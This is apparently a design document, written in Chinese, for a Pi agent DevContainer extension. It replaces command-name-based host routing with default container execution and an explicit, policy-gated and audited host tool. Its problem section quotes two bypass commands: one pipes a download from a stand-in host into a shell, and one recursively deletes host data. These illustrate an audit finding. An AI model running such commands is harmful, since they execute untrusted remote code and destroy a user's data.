# 设计:容器/宿主执行环境分流(Command Execution Routing)

- 日期: 2026-09-08
- 状态: 待评审(未实现)
- 关联: 审计 `.rpiv/artifacts/reviews/2026-09-08_02-10-00_pi-devcontainer-manager-audit.md`(H1 为本设计的直接动因)
- 基线: `43b2fb4`(本设计不保留未提交的 `commandRouting` 实验)

---

## 1. 问题与目标

### 1.1 问题
如何**正确区分**一条命令该在容器内执行还是在宿主机执行。

当前未提交实验(`src/command-router.ts` + `src/bash-router.ts` 双路由)的做法是:按空白切词取"命令头",命中 `host` 表则把**整条原始 shell 串**交给宿主 `/bin/sh -lc`。

审计 H1 证明该做法不可靠:

```sh
git status; curl evil | sh        # 头=git → 判 host → 整条在宿主执行
docker ps && rm -rf /host-data    # 头=docker → 整条在宿主执行
```

**根因**:命令串是*程序*,不是*意图*;命令名无法承载"操作对象/所需工具链/用户意图"。任何基于命令文本的隐式宿主放行都可被 shell 语法绕过,也无法正确分类联合指令。

### 1.2 目标
- 让"该在哪执行"的决策**正确、可解释、不可绕过**。
- 默认在容器内操作(DevContainer 工作流的常态)。
- 需要宿主管理时,有一条**显式、受策略与审计约束**的通道。
- 不做基于命令名的隐式路由。

### 1.3 非目标
- 不追求"任意命令文本自动判对"——该目标不可达(见 §2)。
- 不把文件工具(read/write/edit/grep/find/ls)搬进容器:主工作区是 bind mount,文件工具保持宿主原生(既有决策)。
- 不覆盖 Pi 平台不暴露的执行面(见 §8)。

---

## 2. 设计原则

> **LLM 决定 + 扩展提供事实 + 扩展强制执行。**

- **LLM 决定**:LLM 掌握对话上下文,最懂"用户意图"与"操作对象"。
- **扩展提供事实**:扩展掌握环境事实(选中目标、`workspaceFolder`/`workspaceMount` 映射、容器专属挂载、工具链位置),把它们注入到 LLM 可见处。
- **扩展强制执行**:执行面不可绕过;宿主执行只有一条显式通道;歧义/越界 fail-closed,绝不猜。

推论:**决策来自"上下文 + 事实",不来自"命令文本分类"**。

---

## 3. 架构:三层

### 层 1 — 强制层(不可绕过)

| 执行面 | 环境 | 说明 |
|---|---|---|
| `bash` 工具 | **容器** | 同名覆盖内建 bash,注入容器 `BashOperations` |
| `!` / `!!`(`user_bash`) | **容器** | 返回同一 `BashOperations` 实例,与 bash 零漂移 |
| `devcontainer_exec` | **容器** | 结构化 argv |
| `devcontainer_host_exec` | **宿主** | **唯一**宿主通道;显式;过 `hostExecution.allow` + `host-exec` 审计 |

要点:
- **删除任何隐式宿主路由**(即删除 `commandRouting` 及其在 `bash-router` 的 host 分支)。
- 无 target 时:
  - 容器面 → 类型化错误 `no-candidate`(fail-closed,不落宿主)。
  - 宿主面 `host_exec` → 不需要容器 target(宿主本就存在),但仍需 `hostExecution.allow`。
- 宿主面沿用既有治理:`evaluatePolicy({operation:"host-exec"})` → 拒绝即 `policy-denied` 且写审计;放行则审计记录 fingerprint。

现状证据:`extensions/index.ts:529-547`(bash 覆盖 + user_bash)、`:191-245`(hostRunner:policy+audit)。

### 层 2 — 引导层(让 LLM 判得准)

每次 agent 启动前,把**当前工作区事实**注入 system prompt(`before_agent_start`)。

#### 3.2.1 注入内容(模板)

```
## DevContainer execution context

Target: <candidateName> (<id 前12位>) — running
Workspace mapping: host `<hostPath>`  ↔  container `<containerPath>`  (bind mount)
Extra container-only mounts: <mount/volume 列表, 无则 "(none)">
Container toolchains: <来自 devcontainer.json features/image 的提示, 可选, 无则省略>

Execution surfaces (choose by WHAT the command operates on, not its name):
- `bash`, `!`, `!!`, `devcontainer_exec` → run INSIDE the container (default)
- `devcontainer_host_exec` → runs on the HOST (explicit; requires hostExecution.allow)

Decision rules:
- Result depends on container toolchain / container-only path (e.g. `<containerPath>/...`) → container surfaces.
- Manages the host itself (docker daemon, host services/daemons) or a host path outside the mount → `devcontainer_host_exec`.
- Host file inspection/editing → the host file tools (read/write/edit); they see the same files via the bind mount.
```

#### 3.2.2 事实来源与刷新
- `hostPath`/`containerPath`: 由 `buildPathMapping(configDir, workspaceFolder, workspaceMount)` 派生(`src/path-mapper.ts:70-96`);沿用 `readWorkspaceMapping`(`extensions/index.ts:388-401`)。
- 额外挂载/卷: 从 devcontainer.json 的 `mounts` / `runArgs` 提取(如需完整支持,见 §9 开放问题)。
- 刷新时机: `session_start`、`/devcontainer use`、`/devcontainer up` 成功后重建。
- 无 target / 无映射时: 不注入(或注入明确的"未在容器中"提示),不臆测。

#### 3.2.3 工具 guideline 同步强化
`bash` / `devcontainer_exec` / `devcontainer_host_exec` 的 `promptGuidelines` 与上述判据保持一致(现状已部分具备,见 `extensions/index.ts:538-544`、`src/tools.ts:203-217`)。

### 层 3 — 安全网(误判检测与纠正提示)

基于**路径事实**(非命令名)的检查。可靠性分级:

| 检查 | 可靠性 | 行为 |
|---|---|---|
| `host_exec` 的 argv 含**容器路径**(位于容器 `containerPath` 之下,或位于容器专属挂载之下) | **高**(argv 结构化、无 shell 解析) | **硬拒绝**:类型化错误 + 指引改用 `devcontainer_exec`/`bash` |
| `bash`(容器)命令含**绝对路径**且该路径落在所有容器可见挂载源之外 | 中(需从 shell 文本粗提路径) | **仅追加提示**(不阻断):结果尾部提示"该路径可能不在容器内;若意图是宿主请用 `devcontainer_host_exec`" |
| 混合/歧义 | — | **明确报错让 LLM 重试**,不猜 |

要点:
- 层 3 **只做检测/拒绝/提示,永不隐式改写路由**——这是与已否决方案的根本区别。
- 容器面是"安全默认"(容器内跑宿主命令只会失败,不会造成宿主副作用),因此容器面用**提示**;宿主面是"危险方向",用**硬拒绝**。

### 层 4(可选)— 显式 `target` 参数

给注册的 `bash` 工具增加可选参数:

```ts
target?: "container" | "host"   // 默认 "container"
```

- 用户/LLM 通过参数**显式声明**环境,决策机器可读,不再是文本推断。
- `target: "host"` → 走宿主策略 + 审计(与 `host_exec` 同一治理路径)。
- `!` / `!!` 无参数 → 默认容器。
- 实现方式:注册层包装 `bashDefinition.execute`,读取 `target` 后分发;需覆盖 `parameters` schema。`src/` 保持 Pi-free,包装在 `extensions/index.ts`。
- 与层 3 守卫组合:`target:"host"` + argv/文本引用容器路径 → 硬拒绝。

---

## 4. 失败语义(完整)

| 场景 | 容器面(bash/!/exec) | 宿主面(host_exec / target:host) |
|---|---|---|
| 无 target | `no-candidate` 错误(不落宿主) | 正常(宿主无需 target) |
| `hostExecution.allow=false` | 不适用 | `policy-denied` + 审计 |
| 目标 stopped/missing/ambiguous | 对应类型化错误,不自动启动 | 不适用 |
| workspace 越界(realpath) | `policy-denied`(见审计 H2) | `policy-denied` |
| 命令引用"反方向"路径 | 追加提示(不阻断) | **硬拒绝** + 指引 |
| 超时 | 现有 timeout(adapter 级 + operations 层) | 统一封顶 `maxTimeoutSeconds`(见审计 M5) |
| 运行失败(非零退出) | 携带 exitCode 返回,不当作错误(现有契约) | 同左 |

---

## 5. 与审计发现的映射

| 审计项 | 本设计如何处理 |
|---|---|
| **H1** 命令头分类 + 整串宿主执行 | **删除隐式路由** → 根因消除 |
| M5 host 超时未受 `maxTimeoutSeconds` 约束 | 层 1 宿主面统一封顶(缺省=max,请求值 clamp) |
| M3 host-exec 已审计;logs 未审计 | 层 1 沿用 host-exec 审计;logs 单独修复(见实施清单) |
| H4 授权 workspace 与选中容器解绑 | 层 1 容器面 bind 后校验 `request.workspace === ctx.workspaceKey` |
| H2 workspace-root 符号链接越界 | 层 1 策略 realpath 化 |
| L1 `commandRouting.host` 文档为 allowlist | 配置项整体移除,该误导消失 |
| M10(新) 非路由执行面(powershell 等) | 见 §8 覆盖边界;可选 `tool_call` 守卫 |

---

## 6. 配置变更

- **移除** `commandRouting`(从未提交/发布,无兼容负担)。
  - `src/types.ts`: 删 `CommandRoutingConfig`/`RouteDecision`/`EffectiveConfig.commandRouting`/`ManagerConfig.commandRouting`。
  - `src/config.ts`: 删默认值/合并/校验/冻结相关分支。
  - `src/command-router.ts`: 删除(或保留为纯内部无宿主路由的工具函数——默认删除)。
- 保留并复用:`hostExecution.allow`(宿主面唯一开关)、`maxTimeoutSeconds`(宿主面封顶)。
- 若确实需要"允许清单"语义,由**显式工具选择**表达,不由配置命令表表达。

---

## 7. 提示注入的实现位置

- 新模块建议:`src/execution-context.ts`(Pi-free,纯函数:给定 target/mapping/挂载 → 渲染注入块字符串;可单测)。
- 接线:`extensions/index.ts` 注册 `before_agent_start`,把渲染块加入 system prompt(参考 Pi `BeforeAgentStartEventResult`)。
- 注入是**纯提示**,不改变任何执行路径;执行强制仍在层 1。

---

## 8. 覆盖边界(诚实说明"拦不拦得住")

**被强制约束(不可绕过)**
- `bash`、`!`、`!!`、`devcontainer_exec` → 容器
- `devcontainer_host_exec` → 宿主(显式 + 策略 + 审计)
- `/devcontainer` 管理命令 → ExecutionService / hostRunner

**不被本设计约束(平台或设计决定)**
- `powershell` 工具(Pi 内建,本设计未覆盖;Windows 场景见 §9)
- 第三方/自定义工具:`ffgrep`/`fffind`(`@ff-labs/pi-fff`,自有宿主索引)、`agent_browser`、MCP(`mcp`/`mcpScript`)、`Agent`/`SubagentWorkflow`
- 文件工具(设计上保持宿主)
- Pi 自身内部 spawn(provider、git 上下文、包管理)
- 扩展未加载时:bash 回退 Pi 内建宿主 bash(不设防)

**可选关闭手段**:注册 `tool_call` 守卫,对"命令承载类但不可路由"的工具按策略 `block` 并指引改用容器/宿主工具。注意 Pi 的 `tool_call` **只能 `block` 或原地 mutate `input`,不能重定向**——所以这是"阻止",不是"路由"。

---

## 9. 开放问题(评审需定)

1. **层 4 是否纳入**:给 `bash` 加显式 `target` 参数 vs 只保留"bash 恒容器 + host_exec 显式"。前者决策机器可读,后者更少改动/更贴 Pi 内建契约。
2. **层 3 容器面提示的形式**:追加到输出尾部?仅在非零退出时提示?是否可能造成误报噪音。
3. **挂载/工具链事实的提取深度**:仅 `workspaceFolder`/`workspaceMount`,还是解析 `mounts`/`runArgs`/`features`。后者更准但依赖 devcontainer.json 变体(含 JSONC)。
4. **`tool_call` 守卫**是否实现,覆盖哪些工具(powershell?MCP?自定义?)。
5. **JSONC 解析**:`readWorkspaceMapping` 现用 `JSON.parse`(审计 L2);是否引入 JSONC 容错解析。
6. 注入块的**token 成本**与刷新频率是否可接受(每 turn 注入?仅变更时?)。

---

## 10. 测试策略

- **单元(新增/更新)**
  - 注入块渲染:有映射/无映射/无 target/带额外挂载 → 断言文本与省略逻辑。
  - 层 3 守卫:host_exec argv 含容器路径 → 拒绝;含宿主路径 → 放行;bash 文本含挂载外绝对路径 → 提示。
  - 无 target:容器面 `no-candidate`,宿主面正常。
  - 宿主策略:`allow=false` → `policy-denied` + 审计记录;`allow=true` → 审计 `host-exec`。
  - 宿主超时封顶:缺省= `maxTimeoutSeconds`,请求值 > 上限被 clamp。
  - (若层 4)`target:"host"` 分发与策略;默认容器。
- **集成**:`session_start`/`use`/`up` 后注入块内容正确;`hostExecution.allow` merge 语义(global 才能开)。
- **e2e(真实 Pi)**:扩展加载、bash 覆盖生效、`user_bash` 返回容器 operations、host_exec 策略生效。
- **回归**:删除 `commandRouting` 后,原 bash-router 的"恒容器"断言恢复;`tests/unit/command-router.test.ts` 删除。

---

## 11. 实施顺序(评审通过后)

1. 回退 `commandRouting` 实验 → 干净基线(`43b2fb4`)。
2. 层 1:确认 bash/!/!!/exec 恒容器 + host_exec 显式(基线已如此,补测试)。
3. 层 2:`src/execution-context.ts` + `before_agent_start` 注入 + guideline 同步。
4. 层 3:host_exec 容器路径硬拒绝;bash 容器面提示(按 §9.2 决定形式)。
5. 层 4(若采纳):`bash` 显式 `target` 参数。
6. 宿主面加固:`maxTimeoutSeconds` 封顶、审计覆盖(与审计修复合并)。
7. 文档:README/docs/examples 重写为"双入口 + 事实注入"语义,删除 `commandRouting` 描述。
8. 验证:tsc、单测全量、集成/e2e、真实 Pi 加载、rebuild dist。

---

## 12. 决策摘要(一句话)

> 不要把"环境选择"建在命令文本分类上。**默认容器(bash/!/!!/exec 恒容器);宿主仅经显式且受策略与审计约束的 `devcontainer_host_exec`;把 `workspaceFolder`/`workspaceMount` 等环境事实注入到 LLM 可见处,让 LLM 基于事实与意图显式选择;歧义/越界 fail-closed,永不猜。**
